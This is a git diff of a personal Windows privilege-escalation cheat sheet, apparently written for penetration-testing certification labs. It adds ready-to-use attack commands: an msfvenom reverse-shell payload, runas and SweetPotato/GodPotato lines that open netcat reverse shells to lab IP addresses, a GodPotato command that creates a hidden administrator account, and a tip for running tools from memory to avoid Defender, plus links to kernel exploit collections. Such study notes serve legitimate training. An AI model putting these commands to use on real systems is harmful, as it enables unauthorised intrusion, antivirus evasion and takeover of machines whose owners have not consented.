@@ -25,7 +25,7 @@ Host file -`C:\Windows\System32\drivers\etc\hosts`
 
 ## Commands
 
-### Basic Info gathering
+### Fundamentals
 
 ```
 powershell -ep bypass
@@ -35,53 +35,54 @@ systeminfo - (look for latest hotfixes patched)
 wmic qfe - check patch history (wmi - windows management instrumentation command line quick fix engineering)
 wmic logicaldisk get caption,description,providername
 
+Copy
+[CMD] copy [source] [dest]
+[PS] Copy-Item [source] [dest] 
+
+Move
+[CMD] move [source] [dest]
+[PS] Move-Item [source] [dest]
+
+Hidden Files
+[CMD] dir /A:H 
+[PS] ls -force
+
 findstr /B /C "string" - grep basically
-icacls - ACL to files/directories
 where /R c:\windows bash.exe
 
 dir /R [Watch out for ADS (Alternate data streams) - good way to hide data]
 more < hm.txt:root.txt
-
-dir /A:H (ls -la of cmd.exe)
-ls -force (ls -la of powershell)
 ```
 
 ### Reverse Shells
 
+The only way to get arrows in the shell
+
+`rlwrap nc -lnvp`  &#x20;
+
+Adding powershell and cmd to PATH, some commands like whoami may not work without it
+
+`set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0;`
+
 ```
-Powershell base64 encode reverse shell works most of the time
-nc64.exe best run via cmd or powershell first (eg. cmd.exe /c nc64.exe ...)
+1. Powershell base64 encoded reverse shell works most of the time
+2. nc64.exe best run via cmd or powershell first (eg. cmd.exe /c nc64.exe ...)
+For service overwriting
+3. msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.233 LPORT=1338 -f exe -o rev.exe
 ```
 
-### User Enumeration
+### User & Network Enumeration
 
 ```
 whoami /priv /groups
 net user (lists users on system)
 net user $username - lists all relavant info of that user
 net localgroup $groupname
-```
 
-### Network Enumeration
-
-```
 ipconfig
 arp -a
 netstat -ano | findstr LISTENING
 ```
-
-### Passwords
-
-```
-findstr "/si password *.txt (look for string "password" in any txt file) 
-```
-
-{% code title="Keepass Database" %}
-```
-kpcli -kdb CEH.kdbx ls --group CEH --entries 
-show -f [entry_number]
-```
-{% endcode %}
 
 ### AV Enumeration \[AMSI, AppLocker, Defender]
 
@@ -97,7 +98,7 @@ netsh firewall show state/config
 ## Automated Enumeration
 
 {% hint style="info" %}
-Run these from a SMB network share and not transfer to disk so Defender is not triggered
+Run these from a SMB network share or from memory and not transfer to disk so Defender is not triggered
 {% endhint %}
 
 #### GO TO
@@ -107,14 +108,17 @@ Run these from a SMB network share and not transfer to disk so Defender is not t
 * SharpUp.exe
 * Rubeus.exe
 * Certify.exe
+* Watson.exe
 
 #### TO BE SOON
 
 * Seatbelt.exe
-* Watson.exe
-* Sherlock.ps1 \[Deprecated]
 * jaws-enum.ps1
 * windows-exploit-suggester.py
+
+{% embed url="https://github.com/gladiatx0r/Powerless" %}
+Legacy Windows machines without Powershell
+{% endembed %}
 
 ## Passwords and Port Forwarding
 
@@ -129,6 +133,7 @@ Password exploits
     ```
     cmdkey /list
     runas /savecred /user:username C:\PrivEsc\reverse.exe
+    runas /user:Administrator "nc.exe -e 192.168.45.233 8080 cmd"
     ```
 * Registry - The registry can be searched for keys and values that contain the word "password":
 *   SAM (Security Account Manager)\
@@ -140,6 +145,17 @@ Password exploits
     ```
 * Pass the hash - if `psexec` don't work, `smbexec.py` (half shell) or `wmiexec`
 
+```
+findstr "/si password *.txt (look for string "password" in any txt file) 
+```
+
+{% code title="Keepass Database" %}
+```
+kpcli -kdb CEH.kdbx ls --group CEH --entries 
+show -f [entry_number]
+```
+{% endcode %}
+
 ## Service Exploits
 
 * Insecure Service Permissions
@@ -147,9 +163,21 @@ Password exploits
 * Weak Registry Permissions (If writable by the "NT AUTHORITY\INTERACTIVE" group (essentially all logged-on users)
 
 ```
-C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc #check perms
-sc qc daclsvc
+. .\PowerUp.ps1; Invoke-AllChecks
+icacls - ACL to files/directories [Confirm our write perms on that directory]
 ```
+
+{% embed url="https://kashish.gitbook.io/7/master/windows-privesc/unquoted-service-path" %}
+
+```
+shutdown -r -t 1 [time interval and reboot flags]
+```
+
+## DLL Injection
+
+{% embed url="https://github.com/fatalxs/oscp-cheatsheet/blob/main/13%20Common%20Payloads.md" %}
+payload for service c file and DLL file
+{% endembed %}
 
 ## Token Impersonation
 
@@ -166,6 +194,8 @@ msfvenom to generate powershell payload, check how to do it wo meterpreter tho
 
 **getsystem** - Magic way to become Admin, DO NOT SPAM
 
+{% embed url="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/Get-System.ps1" %}
+
 3 methods
 
 * Named Pipe impersonation (In memory/admin)
@@ -174,13 +204,52 @@ msfvenom to generate powershell payload, check how to do it wo meterpreter tho
 
 #### Potatoes
 
-* SweetPotato - `.\SweetPotato.exe -e EfsRpc -p c:\Users\Public\nc.exe -a "10.10.10.10 1234 -e cmd"`
+Check .NET version for GodPotato, does not miss at all just don't go for a revshell with it no point in getting a SYSTEM shell without 'whoami' for proof
+
+```powershell
+reg query "HKLM\SOFTWARE\Microsoft\Net Framework Setup\NDP" /s
+```
+
+* GodPotato  - `.\GP.exe -cmd "net user /add jtrip jtrip && net localgroup administrators jtrip /add"`
+* PrintSpoofer - .`\PrintSpoofer.exe -i -c cmd`
+* SweetPotato - `.\SweetPotato.exe -e EfsRpc -p C:\programdata\nc.exe -a "192.168.45.205 1234 -e cmd"`
+
+For PrintSpoofer, confirm Print Spooler service
+
+```
+Get-Service Spooler
+```
+
+If you really need it tho
+
+`.\GodPotato-NET4.exe -cmd "cmd /c C:\programdata\nc64.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.205 8001"`
+
+{% embed url="https://jlajara.gitlab.io/Potatoes_Windows_Privesc" %}
+Explain how each potato works
+{% endembed %}
+
+For x86, JuicyPotato is the way?
+
+{% embed url="https://medium.com/@Dpsypher/proving-grounds-practice-authby-96e74b36375a" %}
+
+> ### TL/DR <a href="#tldr" id="tldr"></a>
+>
+> * Use Sweet Potato to rule them all - [Sweet Potato](https://jlajara.gitlab.io/Potatoes_Windows_Privesc#sweetPotato)
+>
+> If you do not want to use Sweet Potato:
+>
+> * If the machine is >= Windows 10 1809 & Windows Server 2019 - Try [Rogue Potato](https://jlajara.gitlab.io/Potatoes_Windows_Privesc#roguePotato) \[SIKE yk wassup]
+> * If the machine is < Windows 10 1809 < Windows Server 2019 - Try [Juicy Potato](https://jlajara.gitlab.io/Potatoes_Windows_Privesc#juicyPotato)
+
+## Macros
+
+{% embed url="https://0xdf.gitlab.io/2020/02/01/htb-re.html#prepare-document" %}
 
 ## Recycle Bin
 
-```
-View items in the bin
+View items in the bin innit
 
+```
 $shell = New-Object -ComObject Shell.Application
 $recycleBin = $shell.Namespace(0xA)
 $recycleBin.items() | Select-Object Name, Path
@@ -199,24 +268,25 @@ $documents.MoveHere($item)
 
 dnSpy the GOAT
 
-<div align="left"><figure><img src="../.gitbook/assets/image (1) (1).png" alt="" width="563"><figcaption></figcaption></figure></div>
+<div align="left"><figure><img src="../.gitbook/assets/image (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure></div>
 
 ## Kernel Exploits
 
-Most basic zero skill vector - this why make sure your systems are always updated
-
 windows-exploit-suggester.py does bitsss (update db before using tho, run locally: feed it systeminfo data and it will run it against its db)
 
-it has exploits for diff builds of windows
+`systeminfo` output required, the git repo tells you how it's done
+
+{% embed url="https://juggernaut-sec.com/kernel-exploits-part-2/" %}
 
 MS10-059 and others very popular: focus on privelege escalation vulns mentioned&#x20;
+
+{% embed url="https://github.com/SecWiki/windows-kernel-exploits" %}
 
 ## Further ones to watch
 
 * Executable Files - \[Ben `AlwaysInstallElevated`]
 * Startup Applications - \[Ben `Autorun`]
-* DLL Hijacking - \[Ben DLL]
 
-## WSL
+#### WSL
 
 not sure if i need it at this point in time so do come back and check up
